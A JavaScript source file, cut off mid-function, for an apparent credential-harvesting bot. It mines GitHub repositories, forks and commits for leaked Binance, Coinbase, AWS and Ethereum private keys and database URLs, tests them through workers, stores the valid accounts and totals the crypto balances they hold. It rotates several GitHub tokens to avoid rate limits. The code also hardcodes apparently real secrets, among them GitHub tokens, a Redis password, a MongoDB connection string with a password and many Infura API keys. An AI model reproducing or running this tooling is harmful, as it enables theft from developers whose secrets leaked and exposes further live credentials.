import  { Octokit } from '@octokit/rest';
import moment from 'moment';
import ccxt, { binance } from 'ccxt';
import mongoose, { Mongoose, PromiseProvider } from 'mongoose';
import GitHubRepoParser from './githubRepoParser';
import models from './models';
import Promise from 'bluebird';
import { convert } from 'html-to-text';
//import { parseForBinanceKeys,  parseForCoinbaseKeys, parseForMongoDatabaseUrls, parseForPrivateKeys, testKeys } from './workers';
import { spawn, Thread, Worker} from 'threads'
import ProxyLists from 'proxy-lists';
import { makeOctokitRequest } from './middlewares';
import Etherscan from 'node-etherscan-api';
import Web3 from 'web3';
import HttpProxyAgent from 'http-proxy-agent';
import proxies from './proxies.json';
import proxy_check from 'proxy-check';
import { CONSOLE_LEVELS } from '@sentry/utils';
import {unique, shuffle} from './helpers'
import { createClient } from 'redis';



const redisClient = createClient({
  url: "redis://redis-15304.c258.us-east-1-4.ec2.cloud.redislabs.com:15304",
  password: 'onQCc19X9AKWNV49irmBFEDlNKoUMp96'
})
redisClient.on('error', (err) => console.log('Redis Client Error', err));


let savage = 'https://mainnet.infura.io/v3/7dde81cce4ae4281bb8a3e2a70516f98'
let ETHEREUM_NODES = ["https://mainnet.infura.io/v3/580d35e44f36477f83545f2ae135a98f",
 "https://mainnet.infura.io/v3/d65858b010d249419cf8687eca12b094", 
 "https://mainnet.infura.io/c1GeHOZ7ipPvjO7nDP7l",
 "https://mainnet.infura.io/v3/b282e18b153f4c909c0036b728c82684",
 "https://mainnet.infura.io/v3/5ed13b00e00c4b7c8f98246c690b7517",
 "https://mainnet.infura.io/v3/580d35e44f36477f83545f2ae135a98f",
 "https://mainnet.infura.io/v3/da3a0e6c08134989bb0ec4ac151d1070",
 "https://mainnet.infura.io/v3/a714c5322edb40dea494dfc2b10fe98a",
 "https://mainnet.infura.io/v3/e63206c81e0b4191b5c7f3889d918f26",
 "https://mainnet.infura.io/v3/2482038532aa4dfa829f200d162e751b",
 "https://mainnet.infura.io/v3/cac377a06eba4b33b96419ed524adfd5",
 "https://mainnet.infura.io/v3/49ddf378eb4241f3ae0523dba6adff96",
 "https://mainnet.infura.io/v3/5a771a036f314670ac2c3b91538b57aa",
 "https://mainnet.infura.io/v3/24f1792c39824f30a65db939f4539343",
 "https://mainnet.infura.io/v3/e1b15c78bd534c47980900784c25fbe2",
"https://mainnet.infura.io/v3/bd72ec702e1d4b2689eb63012a860eb8",
"https://mainnet.infura.io/v3/8c79d20f15e04288ade9b34f595e13e4",
"https://mainnet.infura.io/v3/a6cf4b1705e9430aa9bf1699dad25dc1",
"https://mainnet.infura.io/v3/ecfbe8cf64eb4df391e0fc17e6fe15e6",
"https://mainnet.infura.io/v3/800ff156fefb4424b2c7ba09e03a7ab0",
"https://mainnet.infura.io/v3/c69dc12364b34877806ae76b87c27fce",
"https://mainnet.infura.io/v3/ad612c8d545c4cc1a3d72812769fa1f5",
"https://mainnet.infura.io/v3/6a48654961d14572921bdc5be83c23a9",
"https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
"https://mainnet.infura.io/v3/6d1611ee7c604fe788af638a138456c9",
"https://mainnet.infura.io/v3/c9088eec3e1f402e8a4b1192d940538e",
"https://mainnet.infura.io/v3/3c58212300d94c97a2ee2a188ccd4805",
"https://mainnet.infura.io/v3/89ad39a2ee084e8cab6a81a0a9f1c6a2",
'https://mainnet.infura.io/v3/a1743f084f8a46bfb3696389eeb9f217',
'https://mainnet.infura.io/v3/cad7f83b4e47462e90387487530239af',
'https://mainnet.infura.io/v3/01e4876c179a49ebbf8ad09f7037d9ee',
'https://mainnet.infura.io/v3/483c1730b99b46729c7f82f49302bbf8',
'https://mainnet.infura.io/v3/fa3e2193dfcb48978f731fadf8a1282a',
'https://mainnet.infura.io/v3/139b233124ca4a7cb78ac63cd0a2d29f',
'https://mainnet.infura.io/v3/e846fc35019a4766babcc4e9e757bb74',
'https://mainnet.infura.io/v3/b838cc16e73f482b960d1f86c05533a6',
'https://mainnet.infura.io/v3/4ca56581b1234f2a9cf4b7333c1f8ac1',
'https://mainnet.infura.io/v3/d266a83cc83a40d7b14257be4579d310',
"https://mainnet.infura.io/v3/5ffc47f65c4042ce847ef66a3fa70d4c",
"https://mainnet.infura.io/v3/25c7c08910c04b0c9be79c09f559652e"

]

let BINANCE_NODES = ["https://data-seed-prebsc-1-s1.binance.org:8545"]

const DELAY = 12000



const repoQueryOptions = [
  'binance trading bot',
  'crypto arbitrage',
  'python binance',
  'binance api'
]

const Sentry = require('@sentry/node')
const Trading = require('@sentry/tracing')

const etherscan = new Etherscan('3APKDG28XY7ZBQG6JMA9J5GJWSG3DGJJ29')

Sentry.init({
  dsn: "https://1ff02f3dcce144aaaaa7b424918555f8@o1362299.ingest.sentry.io/6653686",
  integrations: [
    // enable HTTP calls tracing
    new Sentry.Integrations.Http({ tracing: true }),
  ],

  // Set tracesSampleRate to 1.0 to capture 100%
  // of transactions for performance monitoring.
  // We recommend adjusting this value in production
  tracesSampleRate: 1.0,
});



//let jon2 = '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'
let jon = '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'
let user32 = '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'
let otherUser = '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'
//let eaglesfan = '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'







let ghAccounts = [ jon, user32 ]
let ghAccount = ghAccounts[Math.floor(Math.random() * ghAccounts.length)]
let parser

let proxyList = []



const initGithubAccounts = async () => {
  let accounts = []
 //let proxy = new HttpProxyAgent(proxyList[Math.floor(Math.random() * proxyList.length)])
 // console.log('got proxy', proxy)
  return Promise.map(ghAccounts, async account => {
    let temp = new Octokit({
      auth:  account,
     
    })
    const rateLimitData = await temp.rateLimit.get()
    //console.log(rateLimitData)
    if(rateLimitData.data.rate.remaining > 0) {
      accounts.push(temp)
    }
    else {

      console.log('account not available until', moment().fromNow(rateLimitData.data.rate.reset))
      //console.log('but lets try anyway')
      //accounts.push(temp)
    }
  }).then(() => {
    if(accounts.length === 0) {
      console.log('no accounts available')
      
    }
    else {
      console.log('using', accounts.length)
    }
    return Promise.resolve(accounts)
  })
}









const pickRandomUrl = urls => {
  return urls[Math.floor(Math.random() * urls.length)]
}


async function followRepos(query,  ghAccount, page) {
  let urlsQueried = []
  let reposAlreadyLookedAt = 0
  let percentageDone
  // setInterval(() => checkStatus(percentageDone), 20000)
  
  console.log('parsing repos, query is', query, 'page is', page, ghAccount !== undefined)
  const initialRepos = await makeOctokitRequest(ghAccount.rest.search.repos({
    q: query,
    order: 'asc',
    page,
    sort: 'best-match',
    per_page: 100
  }), ghAccount)
  let nodes = initialRepos.data.data.items
  console.log('working with', nodes.length)
  
  let uniqueRepos = new Set(nodes)
  let uniqueRepoArray = Array.from(uniqueRepos)
  let promises = []
  //console.log(uniqueRepoArray.map(item => item))
  Promise.each(uniqueRepoArray, async () => {
    const randomRepo = pickRandomUrl(uniqueRepoArray)
    let repoInDb = await mongoose.model('repos').findOne({html_url: randomRepo.html_url})
   // console.log('repo in db', repoInDb)
   if(repoInDb) {
    reposAlreadyLookedAt +=1
    percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page} lookedAt: ${reposAlreadyLookedAt}, reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
    //console.log('skipping repo')

    //console.log(percentageDone)
    return Promise.resolve(randomRepo)
   }

  else {
      return handleRepo(randomRepo, ghAccount).then(() => {
        reposAlreadyLookedAt += 1
        percentageDone = `percentageDone ${reposAlreadyLookedAt / uniqueRepoArray.length}, totalRepos: ${uniqueRepoArray.length}, page: ${page}, lookedAt: ${reposAlreadyLookedAt},  reposAlreadyLookedAt: ${reposAlreadyLookedAt}, url: ${randomRepo.html_url} `;
        console.log(percentageDone)
        mongoose.model('repos').create(randomRepo).then(res => res.save()).then(() => console.log('repo saved'))
      }).catch(err => {
        console.log(err)
      })
    }
  
  })
  

}
async function parseForks(query) {
  let gh = shuffleAccounts(query)
  const initialRepos = await gh.rest.search.repos({
    q:repoQueryOptions[Math.floor(Math.random() * repoQueryOptions.length)],
    order: 'asc',
    sort: 'committer-date',
    per_page: 1
  })
  const repoInstances = initialRepos.data.items
  return Promise.map(repoInstances, async repo => {
    let gh2 = shuffleAccounts(query) // so its harder to rate limit me
    let forks = await gh2.rest.repos.listForks({
      owner: repo.owner.login,
      repo: repo.name
    })
    const forkInstances = forks.data
    return Promise.map(forkInstances, async forkedRepo => {
      let error = false
      const gh3 = shuffleAccounts(query)
      console.log(forkedRepo.name)
      let commitsForFork
      try {
        commitsForFork = await gh3.rest.repos.listCommits({
          owner: forkedRepo.owner.login,
          repo: forkedRepo.name
        })
      }
      catch(err) {
        error = true
        console.log('error getting commits for fork', forkedRepo.name, err.status)
      }
      if(!error) {
        const commitItems = commitsForFork.data;
        Promise.map(commitItems, async commit => {
          const gh4 = shuffleAccounts(query)
          const parents = commit.parents
          return Promise.map(parents, async parent => {
            const tree = await gh4.rest.git.getTree({
              owner: forkedRepo.owner.login,
              repo: forkedRepo.name,
              tree_sha: parent.sha
            })
            const files = tree.data.tree;
            return Promise.map(files, async file => {
              const gh5 = shuffleAccounts(query)
              const content = await gh5.rest.repos.getContent({
                owner: forkedRepo.owner.login,
                repo: forkedRepo.name,
                path: file.path
              })
              return parse(content).then(testKeys)
            })
          })
        })
      }
     
    })
    
  })
  return  gh.rest.search.repos({q: query, page, order:'asc', sort: 'indexed', per_page: 100})
   .then(res => {
    console.log(query, res.data.items.length)
     let items = res.data.items
     //console.log('first', res.data.items[0])
     let missed = 0
     return Promise.map(items, async item => {
      //console.log(item)
      //console.log('item', item.name, item.html_url)
      const owner = item.owner.login
      const repoName = item.html_url.split('/')[4]
      let forks = await gh.rest.repos.listForks({
        owner,
        repo:repoName
      })
      let f = forks.data
      Promise.map(f, async fork => {
        console.log('got fork', fork !== undefined)
        let commits = await gh.rest.repos.listCommits({
          owner: fork.owner.login,
          repo: fork.name
        })
        const d = commits.data
        Promise.map(d, commit => {
          const parents = commit.parents
          Promise.map(parents, async parent => {
            const tree = await gh.rest.git.getTree({
              owner: fork.owner.login,
              repo: fork.name,
              tree_sha: parent.sha
            })
            console.log('got tree', tree !== undefined)
            const files = tree.data.tree
            Promise.map(files, async file => {
              const content = await gh.repos.getContent({
                owner: fork.owner.login,
                repo: fork.name,
                path: file.path
              })
              console.log('got content of file', content !== undefined)
              return parse(content).then(testKey)
              
            })
           
          })
        })
      })
    }).catch(err => err)
  }).catch(err => err)
}



   


//should be able to parse the files and commits at the same time
// I offloaded both tasks to seperate worker threads.
const handleRepo = async (repo, ghAccount) => {
  console.log('repo added to queue', repo.html_url)
  let work = []
  const data = await parser.collectData(repo.html_url)
  const commits = await makeOctokitRequest(ghAccount.rest.repos.listCommits({
    owner: repo.owner.login,
    repo: repo.name
  }), ghAccount)
  
  
  const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
  let files = []
  let filesChecked = 0
  
  //console.log('data', data)
  Object.keys(data).map(k => {
    if(k === 'env') {
      console.log('env found', data[k])
    }
    if(shouldIgnore.indexOf(k) === -1) {
      
      data[k].forEach(url => {
        files.push(url)
      })
    }
   
      
    })
  // const commitParser = await spawn(new Worker('./workers/parseCommits'))
//  let commitPromiseChain =  await commitParser(commits.data.data).then(async res => {
//     console.log('finished parsing commits', res)
//     await Thread.terminate(commitParser)
//   })
  files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
  
  return Promise.each(files, async (file, index) => {
    return makeOctokitRequest(ghAccount.request(`GET ${file}`), ghAccount).then(async res => {
      if(typeof res.data.data === 'object') {
        console.log('skipping file')
       return Promise.resolve(file)
      }
      let text = convert(res.data.data, {
        wordwrap: 130
      })
      
      let fileParser = await spawn(new Worker('./workers/parseFile'))
      let result = await fileParser(text)
      const { binanceKeys, coinbaseKeys, stripeKeys, mongoDatbases, privateKeys } = result
      if(binanceKeys.length > 0) {
        let binanceKeyTester = await spawn(new Worker('./workers/testBinanceKeys'))
        let results = await binanceKeyTester(binanceKeys)
        console.log(results)
        await Thread.terminate(binanceKeyTester)
      }

      if(privateKeys.length > 0) {
        let privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
        let results = await privateKeyTester(privateKeys)
        console.log('privat key results', results)
        // /Thread.terminate(privateKeyTester)
      }

      if(coinbaseKeys.length > 0) {
        let testCoinbaseKeys = await spawn(new Worker('./workers/testCoinbaseKeys'))
        let results = await testCoinbaseKeys(coinbaseKeys)
        console.log(results)
        Thread.terminate(testCoinbaseKeys)
      }
    
      await Thread.terminate(fileParser)
      return result
    })
      
  }).then(() => {
   return  mongoose.model('cryptoAccounts').count().then(count => {
      console.log('crypto accounts', count)
    })
  })
  
}
const followCommits = async (query, gh, page) => {
  return makeOctokitRequest(gh.rest.search.commits({q:query, page, per_page:10}), gh).then(async data => {
    const files = data.data.data.items
    console.log('got files', files.length)
    for(let i =0; i < files.length; i++) {
      let file = files[i]
      let owner = file.repository.owner.login
      let repo = file.repository.name
      let result = await makeOctokitRequest(gh.request(`GET ${file.url}`), gh)
      let commitFiles = result.data.data.files
      console.log('got commitFiles', commitFiles.length)
      for(let t =0; t< commitFiles.length; t++) {
        let commitFile = commitFiles[t]
        let file_sha 
        try {
          file_sha = commitFile.sha
        }
        catch(err) {
          console.log(err)
        }
        try {
          
          let content = await makeOctokitRequest(gh.rest.git.getBlob({owner, repo, file_sha}), gh)
          
          let file = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
          console.log(file)
          
          let fileParser = await spawn(new Worker('./workers/parseFile'))
          let result = await fileParser(file)
          console.log('result object', result.privateKeys)

          
          if(result?.mongoDatabases) {
            const mongoinspector = await spawn(new Worker('./workers/mongoDBInspector'))
            const result = await mongoinspector(result.mongoDatabases)
            console.log('finished checking db', result)
            setTimeout(async() => await Thread.terminate(mongoinspector), 5000)
            
          }
          if(result?.privateKeys) {
            const privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
            const res = await privateKeyTester(result.privateKeys)
            console.log(res)
            setTimeout(async() => await Thread.terminate(privateKeyTester), 5000)
          }
          if(result?.awsCreds) {
            console.log('yooo a new aws credential was found', result.awsCreds)
            let testCredentials = await spawn(new Worker('./workers/testAWSCredentials'))
            let res = await testCredentials(result.awsCreds)
            console.log('aws callback', res)
            setTimeout(async() => await Thread.terminate(testCredentials), 5000)
          }
          setTimeout(async() => {
            Thread.terminate(fileParser)
          }, 5000)

        }
        catch(err) {
          console.log(err)
        }
        
        
        
      }
    }
    // let commitParser = await spawn(new Worker('./workers/parseCommits'))
    // console.log('got commit parser', commitParser)
    // console.log(data.data.data.items[0])
    // await commitParser(data.data.data.items).then(() => {
    //   console.log('need more commits', query)
    //    return Thread.terminate(commitParser)
    // })
  })

}
const fetchCode = async (query, ghAccount, page, per_page) => {
  let reposAlreadyLookedAt = 0
  
  let urlsQueried = []

  const code = await makeOctokitRequest(ghAccount.rest.search.code({
    q: query,
    order: 'desc',
    sort: 'best-match',
    per_page,
    page
  }), redisClient).catch(err => err)
  let codeItems = []
  try {
    codeItems = code.data.items;
    return {codeItems, info: code.data.data }
    //console.log('working with', code.data.items.length)
    
    //console.log(code.data.items[0])
  }
  catch(err) {
   console.log(err)
  }
  
  
  for(let i=0; i< codeItems.length; i++) {
    const item = codeItems[i]
    const content = await makeOctokitRequest(ghAccount.rest.git.getBlob({
      owner: item.repository.owner.login,
      repo: item.repository.name,
      file_sha: item.sha
    }), ghAccount)
    const codeFile = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
    let fileParser = await spawn(new Worker('./workers/parseFile'))
    let result = await fileParser(codeFile) // kill file parser when done
    const { binanceKeys, coinbaseKeys, stripeKeys, mongoDatbases, privateKeys } = result
    if(binanceKeys.length > 0) {
      let binanceKeyTester = await spawn(new Worker('./workers/testBinanceKeys'))
      let results = await binanceKeyTester(binanceKeys)
      console.log(results)
      await Thread.terminate(binanceKeyTester)
    }

    if(privateKeys.length > 0) {
      let privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
      let results = await privateKeyTester(privateKeys)
      console.log(results)
      Thread.terminate(privateKeyTester)
    }

    if(coinbaseKeys.length > 0) {
      let testCoinbaseKeys = await spawn(new Worker('./workers/testCoinbaseKeys'))
      let results = await testCoinbaseKeys(coinbaseKeys)
      console.log(results)
      Thread.terminate(testCoinbaseKeys)
    }
    
    await Thread.terminate(fileParser)
  }

  //console.log(uniqueRepoArray.map(item => item))
  // return Promise.each(codeItems, async (item, index) => {
  //   const content = await makeOctokitRequest(ghAccount.rest.git.getBlob({
  //     owner: item.repository.owner.login,
  //     repo: item.repository.name,
  //     file_sha: item.sha
  //   }), ghAccount)
    
  //   const codeFile = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
  //   let fileParser = await spawn(new Worker('./workers/parseFile'))
  //   let result = await fileParser(codeFile) // kill file parser when done
  //   const { binanceKeys, coinbaseKeys, stripeKeys, mongoDatbases, privateKeys } = result
  //   if(binanceKeys.length > 0) {
  //     let binanceKeyTester = await spawn(new Worker('./workers/testBinanceKeys'))
  //     let results = await binanceKeyTester(binanceKeys)
  //     console.log(results)
  //     await Thread.terminate(binanceKeyTester)
  //   }

  //   if(privateKeys.length > 0) {
  //     let privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
  //     let results = await privateKeyTester(privateKeys)
  //     console.log(results)
  //     Thread.terminate(privateKeyTester)
  //   }

  //   if(coinbaseKeys.length > 0) {
  //     let testCoinbaseKeys = await spawn(new Worker('./workers/testCoinbaseKeys'))
  //     let results = await testCoinbaseKeys(coinbaseKeys)
  //     console.log(results)
  //     Thread.terminate(testCoinbaseKeys)
  //   }
    
  //   await Thread.terminate(fileParser)
  //   // Object.keys(result).map(k => {
  //   //   if(k === 'mongoDatabases') {
  //   //     if(result[k] !== undefined) {

  //   //     }
  //   //   } // the only thing thats not an array
  //   //   if(result[k].length > 0) {

  //   //   }
  //   // })
  // })
}
async function parseCode(query, ghAccount, page) {
  console.log('running for query', query, page)
  fetchCode(query, ghAccount, page )
  
}



        


const runAction = (actionType, query, ghAccount, page) => {
  switch(actionType) {
    case 'parseCode':
      return parseCode(query, ghAccount, page).catch(console.log)
    case 'parseForks':
      return parseForks(query)
    case 'followRepos':
      return followRepos(query, ghAccount, page)
    case 'followCommits':
      return followCommits(query, ghAccount, page)
    default:
      followRepos(query)
  }
}


const runNormal = async () => {
  console.log('running normally')
  const work = []
  initGithubAccounts().then(async accounts => {
    console.log('got accounts', accounts.length)
    let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
    //parser = new GitHubRepoParser(ghAccount)
    let page = Math.floor(Math.random() * (10 - 1 + 1) + 1)
    const topicCount = await mongoose.model('repos').countDocuments({ topics: { $exists: true, $not: {$size: 0} } })
    var random = Math.floor(Math.random() * topicCount)
    const query = 'delete .env'
    console.log('topics', topicCount)
    let queryForRepo = 'web3'
    //work.push(runAction('parseCode', `coinbase 1`, ghAccount, page))
   // work.push(runAction('parseCode', `language:javascript const binance ${Math.floor(Math.random() * 1000)}`, ghAccount, page))
   // work.push(runAction('parseCode', 'getAccountTotalAndBalances', ghAccount, page))
    // work.push(runAction('parseCode', 'web3.eth', ghAccount, page))
    // work.push(runAction('parseCode', "self.portfolio", ghAccount, page))
    // work.push(runAction('parseCode', 'self.client.get_account():', ghAccount, page))
    // work.push(runAction('parseCode', 'import BINANCE_API_KEY', ghAccount, page))
    // work.push(runAction('parseCode', 'class Binance:', ghAccount, page))
   // work.push(runAction('followRepos', queryForRepo, ghAccount, page))
    //work.push(runAction('followCommits', query, ghAccount, page))
    return Promise.all(work)
   
  })
   
}
const startInitial = async () => {
  console.log('running initial')
  const work = []
  initGithubAccounts().then(async accounts => {
    
    let ghAccount = accounts[1]
    parser = new GitHubRepoParser(ghAccount)
    let page = 1
    const topicCount = await mongoose.model('repos').countDocuments({ topics: { $exists: true, $not: {$size: 0} } })
    var random = Math.floor(Math.random() * topicCount)
    const query = 'delete .env'
    console.log('topics', topicCount)
    let queryForRepo = 'web3'
    //work.push(runAction('parseCode', `binance.apiKey=`, ghAccount, page))
    //work.push(runAction('parseCode', `language:javascript const binance ${Math.floor(Math.random() * 1000)}`, ghAccount, page))
     //work.push(runAction('parseCode', 'import Etherscan from ', ghAccount, page))
     //work.push(runAction('parseCode', "open_orders", ghAccount, page))
     //work.push(runAction('parseCode', 'web:', ghAccount, page))
    // work.push(runAction('parseCode', 'import poloniex', ghAccount, page))
    for(let i=0; i< 10; i++) {
      work.push(runAction('parseCode', 'ccxt.binance({apiKey:})=', ghAccount, i))
    }
    
    //work.push(runAction('followRepos', queryForRepo, ghAccount, page))
   //work.push(runAction('followCommits', query, ghAccount, page))
    //return Promise.all(work).catch(err => startInitial())
   
  })
}
const removeRepos = () => {
  return mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
  mongoose.model('repos').remove().then(console.log)
})
}

const start =  async () => {
  process.on('uncaughtException', (err) => console.log(err))
  process.on('unhandledRejection', (err) => {
    console.log(err)
    console.log(err)
  })
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    console.log('connected to db')
    setInterval(() => runNormal(), 600000)// 10 minutes
    startInitial()
  })
}

const calculateTotals = () => {
  let totals = {}
  let seen = []
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    mongoose.model('binanceAccounts').find().then(accounts => {
      return Promise.each(accounts, async account => {
       
          account.cryptos.forEach(crypto => {
            if(totals[crypto.crypto] === undefined) {
              totals[crypto.crypto] = crypto.balance
            }
            else {
              totals[crypto.crypto] += crypto.balance
            }
            
          })
        })
    }).then(() => console.log(totals))
  })
}

const calculateTotalsCrypto = () => {
  let totalWei = 0
  let accountAddresses = []
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    mongoose.model('cryptoAccounts').find().then(accounts => {
      console.log('got accounts', accounts.length)
      return Promise.each(accounts, async (account, index) => {
          let w3 = new Web3('https://mainnet.infura.io/v3/9e34ce9faf8b4c6ca400b914af9cb665')
         try {
            let ac = await w3.eth.accounts.privateKeyToAccount(account.privateKey)
            let balance = await w3.eth.getBalance(account.address)
            if(balance > 0 && accountAddresses.indexOf(account.address) === -1) {
              let ethBalance =Number(w3.utils.fromWei(balance, 'ether'))
              totalWei += ethBalance
              accountAddresses.push(account.address)
            }
           
            console.log('current balance', totalWei)
            console.log('done %', index/accounts.length)
          }
         catch(err) {
          console.log(err)
         }
         
        })
    }).then(() => console.log(totalWei))

  })
}
//ethersan.getAccountBalance("0xf1764afBeb4a034b5EbA400A6d893A1258705A25", 'ETH').then(console.log)

const runEtherscanBot = () => {
  mongoose.connect('mongodb+srv://jkol36:TheSavage1990@cluster0.bvjyjf3.mongodb.net/?retryWrites=true&w=majority').then(() => {
    console.log('connected to db')
    
   return initGithubAccounts().then(accounts => {
    let ghAccount = accounts[2]
    parser = new GitHubRepoParser(ghAccount)
   return etherscan.getRecentBlockNumber().then(blockNumber => {
      return etherscan.getBlockByNumber(blockNumber)
    }).then(transactions => {
      console.log(transactions.transactions.length)
      transactions.transactions = transactions.transactions.splice(20,transactions.transactions.length)
      return Promise.each(transactions.transactions, transaction => {
        let {to, from} = transaction
        let toFrom = [to, from]
        
        return Promise.each(toFrom, async address => {
          const code = await makeOctokitRequest(ghAccount.rest.search.code({
            q: address,
            order: 'desc',
            sort: 'best-match',
            per_page: 1,
            page: 1
          }), ghAccount).catch(err => err)
          let codeItems
          try {
            codeItems = code.data.data.items;
            const repos = code.data.data.items.map(item => item.repository)
            console.log('got repos', repos.length)
            return Promise.map(repos, async repo => {
              return handleRepo(repo, ghAccount)
            }).then(res => {
              mongoose.model('cryptoAccounts').count().then(count => {
                console.log('crypto accounts', count)
              })
            }).catch(err => console.log(err))
            
            //console.log('working with', code.data.items.length)
            
            //console.log(code.data.items[0])
          }
          catch(err) {
            console.log(err)
            
          }
        })
      }).catch(err => console.log(err))
     
    }).catch(err => console.log(err))
   })
  })
}


const collectCode = async (page) => {
  let ghAccount = await initGithubAccounts()
  const commits = await makeOctokitRequest(ghAccount[0].rest.search.commits({
    q: 'delete .env',
    order: 'asc',
    sort: 'recently-committed',
    per_page: 10,
    page
  }), ghAccount[0])
  console.log('commits', commits.data.data.items.length, 'page', page)
  const repos = commits.data.data.items.filter(item => item.repository.full_name.indexOf('crypto') !== -1)
  if(repos.length > 0) {
    console.log('found possible repos', page)
    console.log(repos)
    await Promise.delay(DELAY)
    collectCommits(page+=1)
  }
  else {
    await Promise.delay(DELAY)
    collectCommits(page+=1)
  }

}
const collectCommits = async (page) => {
  let ghAccount = await initGithubAccounts()
  const commits = await makeOctokitRequest(ghAccount[0].rest.search.commits({
    q: 'delete .env',
    order: 'asc',
    sort: 'recently-committed',
    per_page: 10,
    page
  }), ghAccount[0])
  console.log('commits', commits.data.data.items.length, 'page', page)
  const repos = commits.data.data.items.filter(item => item.repository.full_name.indexOf('crypto') !== -1)
  if(repos.length > 0) {
    console.log('found possible repos', page)
    console.log(repos)
    await Promise.delay(DELAY)
    collectCommits(page+=1)
  }
  else {
    await Promise.delay(DELAY)
    collectCommits(page+=1)
  }

}

const logAndParseFile= async (owner, repo, file_sha, gh) => {
  console.log(owner, repo, file_sha, gh!== undefined)
  let c = await makeOctokitRequest(gh.rest.git.getBlob({owner, repo, file_sha}), redisClient).then(console.log).catch(console.log)
  console.log(c)
  // let file = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
  // console.log(file)
  // console.log('------end of file -----', content.data.data.name)
  
  // let fileParser = await spawn(new Worker('./workers/parseFile'))
  // let results = await fileParser(file)
  // console.log('file parser results', results)
  // return results
}
const searchReposAndUsers = async (query, page) => {
  const continueWithParse = async (envCommit) => {
    console.log('env commit found', envCommit)
    const owner = envCommit[0].author.login
    const repo = envCommit[0].repository.name
    const file_sha =  await (await makeOctokitRequest(ghAccount.request(`GET ${envCommit[0].url}`), redisClient)).data.data.files[0].sha
    await logAndParseFile(owner, repo, file_sha, redisClient)

  }

  const continueWithFile = async (fileMetaData, gh) => {
    const owner = fileMetaData.repository.owner.login
    const repo = fileMetaData.repository.name
    const file_sha = fileMetaData.sha
    let content = await makeOctokitRequest(gh.rest.git.getBlob({owner, repo, file_sha}), redisClient)
    console.log('got content', content)
    let file = Buffer.from(content.data.data.content, 'base64').toString('utf-8')
    let fileParser = await spawn(new Worker('./workers/parseFile'))
    let result = await fileParser(file)
    console.log('result', fileMetaData.name)
    console.log('-----------------------')
    console.log(result)
    console.log('----end of result----')
    if(result.privateKeys.length > 0) {
      let privateKeyTester = await spawn(new Worker('./workers/testPrivateKeys'))
      let detailsForKey = await privateKeyTester(result.privateKeys)
    }
    setTimeout(async () => {
      console.log('terminating file parser')
      return Thread.terminate(fileParser)
    }, DELAY)

  }
  console.log('starting to collect repos')
  let accounts = await initGithubAccounts()
  let ghAccount = accounts[Math.floor(Math.random() * accounts.length)]
  const repoData = await makeOctokitRequest(ghAccount.rest.search.repos({
    q: query,
    order: 'asc',
    sort: 'recently-indexed',
    per_page: 1,
    page
  }), redisClient)
  //search repo for private keys
  console.log('initital repo data', repoData.data.items[0] !== undefined)
  let privateKeyQuery = `${'PRIVATE_KEY='} repo:${repoData.data.items[0].full_name}`
  console.log(privateKeyQuery)
  await Promise.delay(DELAY)
  let {codeItems, info} = await fetchCode(privateKeyQuery, ghAccount, 1, 1)
  console.log('code files for repo', codeItems[0] !== undefined)
  if(!codeItems.length > 0) {
    console.log('no private key found for repo', repoData.data.items[0].full_name)
    return searchReposAndUsers(query, page+=1)
  }
  else {
    console.log('got some files for repo')
    await continueWithFile(codeItems[0], ghAccount)
    await Promise.delay(5000)
    //search repo for committed .env
    let dotEnvQuery = `.env repo:${repoData.data.items[0].full_name}`
    try {
      let envCommit = await (await makeOctokitRequest(ghAccount.rest.search.commits({q: dotEnvQuery, page: 1, per_page:1}), ghAccount)).data.data.items
      await continueWithParse(envCommit)
      console.log('repo done', repoData.data.data.items[0].full_name)
      await Promise.delay(5000)
      return searchReposAndUsers(query, page+=1)
    }
    catch(err) {
      console.log('no mention of dot env for repo', repoData.full_name)
      console.log('repo done', repoData.data.data.items[0].full_name)
      await Promise.delay(5000)
      return searchReposAndUsers(query, page+=1)
    }
  }

  //let parser = await spawn(new Worker('./workers/parseFile'))
  
}
//etherscan.getTransactionByHash('0xa00e9f45e9f0c328446d13a90db1b8ff531c4946ba6a4294a1ec03159cc44b').then(console.log)
//runEtherscanBot()
const collectFiles = async (users) => {
  console.log('collecting files', users.length)
    let ghAccount =await  (await initGithubAccounts())[Math.floor(Math.random() * 2)]
    let checklist = ['privKey']
    let results = []
    for(let i=0; i< 5; i++) {
      console.log(users[i])
      for(let t=0; t<= checklist.length; t++) {
        let keyword = checklist[t]
        try{
          let result = await makeOctokitRequest(ghAccount.rest.search.code({
            q: `${users[i].login}: ${keyword}`,
            
          }), ghAccount).catch(err => console.log(err))
          console.log(result)
          if(result) {
            let files = result.data.data.items
            console.log(`result for ${keyword} ${files.length}`)
            if(files.length > 0) {
              results.push(files)
            }
          }
        }
        catch(err) {
          console.log(err)
        }
      }
    }
    return results.reduce((a, b) => [...a, ...b])
}

 const collectBlobs = async (files) => {
